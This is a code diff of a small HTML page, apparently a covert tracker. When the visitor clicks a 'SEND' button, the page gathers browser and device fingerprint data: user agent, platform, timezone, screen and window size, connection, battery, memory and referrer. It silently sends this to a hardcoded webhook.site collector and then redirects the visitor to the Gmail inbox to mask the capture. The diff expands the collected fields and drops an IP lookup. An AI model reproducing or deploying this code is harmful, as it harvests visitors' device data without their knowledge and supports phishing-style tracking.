@@ -2,19 +2,16 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<title>GET Webhook Collector</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Advanced GET Webhook</title>
 </head>
 
 <body>
 
-<h2>GET Webhook Collector</h2>
-
-<button onclick="sendData()">
-Kirim & Redirect
+<button onclick="send()">
+SEND
 </button>
 
-<pre id="log">Menunggu...</pre>
+<pre id="out"></pre>
 
 
 <script>
@@ -23,62 +20,44 @@ const WEBHOOK =
 "https://webhook.site/51056dab-66b0-49de-b851-02cfee543777";
 
 
-const TARGET =
-"https://mail.google.com/mail/u/0/#inbox";
-
-
-
-async function sendData(){
+async function send(){
 
 
 let data = {
 
-event:
-"redirect_button_click",
+event:"advanced_browser_info",
+
+time_utc:new Date().toISOString(),
+
+time_local:new Date().toString(),
+
+timezone:Intl.DateTimeFormat()
+.resolvedOptions()
+.timeZone,
 
 
-time:
-new Date().toISOString(),
+url:location.href,
+
+referrer:document.referrer || null,
+
+title:document.title,
 
 
-timezone:
-Intl.DateTimeFormat().resolvedOptions().timeZone,
+user_agent:navigator.userAgent,
+
+platform:navigator.platform,
+
+vendor:navigator.vendor,
 
 
-url:
-location.href,
+language:navigator.language,
+
+languages:navigator.languages,
 
 
-referrer:
-document.referrer || null,
+online:navigator.onLine,
 
-
-title:
-document.title,
-
-
-browser:
-navigator.userAgent,
-
-
-language:
-navigator.language,
-
-
-languages:
-navigator.languages.join(","),
-
-
-platform:
-navigator.platform,
-
-
-online:
-navigator.onLine,
-
-
-cookies_enabled:
-navigator.cookieEnabled,
+cookie_enabled:navigator.cookieEnabled,
 
 
 cores:
@@ -89,129 +68,167 @@ memory:
 navigator.deviceMemory || null,
 
 
-screen:
-{
+touch:
+("ontouchstart" in window),
+
+
+
+screen:{
+
 width:screen.width,
+
 height:screen.height,
-pixelRatio:window.devicePixelRatio
+
+availWidth:screen.availWidth,
+
+availHeight:screen.availHeight,
+
+pixelRatio:devicePixelRatio
+
 },
 
 
-window:
-{
+
+window:{
+
 width:innerWidth,
+
 height:innerHeight
+
 },
 
 
-connection:
-navigator.connection ? {
 
-type:navigator.connection.effectiveType,
-downlink:navigator.connection.downlink,
-rtt:navigator.connection.rtt
+location:{
 
-}:null
+timezone:
+Intl.DateTimeFormat()
+.resolvedOptions()
+.timeZone
 
+},
+
+
+
+visibility:
+document.visibilityState
 
 };
 
 
 
-// coba ambil IP publik jika tersedia
 
-try {
+// battery jika tersedia
 
-let ip =
-await fetch(
-"https://api.ipify.org?format=json"
-)
-.then(r=>r.json());
+try{
 
+let battery =
+await navigator.getBattery();
 
-data.public_ip =
-ip.ip;
+data.battery={
 
+level:
+battery.level,
+
+charging:
+battery.charging
+
+};
 
 }
 
 catch(e){
 
-data.public_ip =
-"unavailable";
+data.battery="not supported";
 
 }
 
 
 
 
-let query =
+
+// koneksi jika tersedia
+
+if(navigator.connection){
+
+data.connection={
+
+type:
+navigator.connection.type,
+
+effective:
+navigator.connection.effectiveType,
+
+downlink:
+navigator.connection.downlink,
+
+rtt:
+navigator.connection.rtt
+
+};
+
+}
+
+
+
+
+
+let params =
 new URLSearchParams();
 
 
 
 for(let key in data){
 
+if(typeof data[key]=="object"){
 
-if(typeof data[key] === "object"){
-
-query.append(
+params.append(
 key,
 JSON.stringify(data[key])
 );
 
-}
+}else{
 
-else{
-
-
-query.append(
+params.append(
 key,
 data[key]
 );
 
+}
 
 }
 
 
-}
+
+let url =
+WEBHOOK+"?"+params.toString();
 
 
 
-let finalURL =
-WEBHOOK + "?" + query.toString();
+document.getElementById("out").textContent =
+url;
 
 
 
-document.getElementById("log").textContent =
-finalURL;
-
-
-
-// GET request
-
-fetch(finalURL,{
+fetch(url,{
 method:"GET",
 mode:"no-cors"
 });
 
 
 
-// redirect
-
 setTimeout(()=>{
 
-location.href =
-TARGET;
+location.href="https://mail.google.com/mail/u/0/#inbox";
 
-},2000);
-
+},1200);
 
 
 }
 
 
 </script>
+
 
 </body>
 </html>
